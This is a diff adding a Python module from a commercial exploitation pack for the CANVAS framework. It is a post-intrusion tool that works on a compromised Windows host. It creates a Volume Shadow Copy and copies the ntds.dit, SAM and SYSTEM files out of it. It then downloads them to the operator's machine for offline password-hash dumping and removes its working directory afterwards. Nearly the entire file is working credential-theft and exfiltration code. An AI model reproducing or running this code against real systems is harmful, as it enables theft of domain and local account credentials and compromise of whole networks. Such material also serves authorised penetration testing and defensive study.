@@ -1,0 +1,139 @@
+#! /usr/bin/env python
+
+#
+# Proprietary D2 Exploitation Pack source code - use only under the license
+# agreement specified in LICENSE.txt in your D2 Exploitation Pack
+#
+# Copyright DSquare Security, LLC, 2007-2009
+#
+
+import sys, os
+import pygtk
+import gobject
+
+pygtk.require("2.0")
+import gtk
+import gtk.glade
+
+sys.path.append(".")
+
+from canvasexploit import canvasexploit
+from canvaserror import *
+from exploitutils import *
+from tcpexploit import tcpexploit
+
+VERSION                = "0.1"
+NAME                   = "d2sec_vss"
+DESCRIPTION            = "Tool to download ntds.dit, SAM and SYSTEM files from a Windows Mosdef node"
+
+DOCUMENTATION          = {}
+DOCUMENTATION["Notes"] = """
+This tool is useful to download ntds.dit, SAM and SYSTEM files from a Windows
+Mosdef node and to do offline hash dumping. It creates a Volume Shadow
+Copy to copy these files from a live Windows system.
+"""
+
+PROPERTY               = {}
+PROPERTY['TYPE']       = "Post-Intrusion"
+PROPERTY['SITE']       = "Local" 
+PROPERTY['ARCH']       = [ ["Windows"] ]
+
+class theexploit(canvasexploit):
+
+  def __init__(self):
+    canvasexploit.__init__(self)
+    self.name = NAME
+    self.node = '' 
+    self.supportedNodeArgs = [["win32Node"]]
+    self.vbs = "C:\\d2sec\\d2sec_vss.vbs"
+    self.shadow = ""
+    self.dst = "/tmp"
+
+  def upload_vbs(self):
+    vbs = os.getcwd()+"/3rdparty/D2SEC/exploits/d2sec_vss/Ressources/d2sec_vss.vbs"
+    try:
+      self.node.shell.runcommand("mkdir C:\\d2sec")
+      self.node.shell.upload(vbs, "", self.vbs)
+      self.log("[D2] d2sec_vss.vbs upload to %s" % self.vbs)
+      return 1
+    except Exception, e:
+      self.log("[D2] can't upload d2sec_vss.vbsi: %s" % e)
+    return 0
+  
+  def status_service(self):
+    cmd = "cscript.exe //nologo %s /status" % self.vbs
+    return self.node.shell.runcommand(cmd)
+
+  def start_service(self):
+    self.log("[D2] Starting Volume Shadow Service (VSS)")
+    str = self.status_service()
+    if "Running" in str:
+      self.log("[D2] VSS already started")
+      return 1
+    cmd = "cscript.exe //nologo %s /start" % self.vbs
+    self.node.shell.runcommand(cmd)
+    str = self.status_service()
+    if "Running" not in str:
+      self.log("[D2] Can't start VSS")
+      return 0
+    return 1
+    
+  def stop_service(self):
+    self.log("[D2] Stopping Volume Shadow Service and deleting C:\\d2sec")
+    cmd = "cscript.exe //nologo %s /stop" % self.vbs
+    self.node.shell.runcommand(cmd)
+    ret = self.node.unlink(self.vbs)
+    if not ret:
+      self.log("[D2] Could not unlink file %s" % self.vbs)
+    self.node.shell.runcommand("rmdir C:\\d2sec")
+
+  def create_shadow_copy(self):
+    self.log("[D2] Attempting to create a shadow copy")
+    cmd = "cscript.exe //nologo %s /create C" % self.vbs
+    self.node.shell.runcommand(cmd)
+    cmd = "cscript.exe //nologo %s /list" % self.vbs
+    str = self.node.shell.runcommand(cmd)
+    nfo = str.count("Device object")
+    self.shadow = "\\\?\GLOBALROOT\Device\HarddiskVolumeShadowCopy%d" % nfo
+    self.log('[D2] Shadow copy created: %s' % self.shadow)
+
+  def copy_and_download(self):
+    self.log("[D2] Downloading ntds.dit, SAM and SYSTEM files to %s" % self.dst)
+    self.node.shell.runcommand("copy %s\\windows\\ntds\\ntds.dit C:\\d2sec" % self.shadow)
+    self.node.shell.runcommand("copy %s\\windows\\system32\\config\\SAM C:\\d2sec" % self.shadow)
+    self.node.shell.runcommand("copy %s\\windows\\system32\\config\\SYSTEM C:\\d2sec" % self.shadow)
+    files = ['ntds.dit', 'SAM', 'SYSTEM']
+    for f in files:
+      try:
+        self.node.shell.download('C:\\d2sec\\%s'%f, '%s/%s'%(self.dst, f))
+        self.node.unlink('C:\\d2sec\\%s'%f)
+      except Exception, e:
+        self.log('[D2] %s' % e)
+        continue
+
+  def download_files(self):
+    if not self.upload_vbs():
+      return 0
+    if not self.start_service():
+      return 0
+    self.create_shadow_copy()
+    self.copy_and_download()
+    self.stop_service()
+    return 1
+
+  def getargs(self):
+    self.dst = self.argsDict.get("dst", self.dst)
+
+  def run(self):
+    self.getargs()
+    for node in self.argsDict["passednodes"]:
+      type = node.nodetype
+      if type not in self.supportedNodeArgs[0]:
+        self.log('[D2] %s node type not supported' % type)
+        continue
+      self.node = node
+    return self.download_files()
+
+if __name__ == "__main__":
+  print "This module is meant to be run only within CANVAS"
+
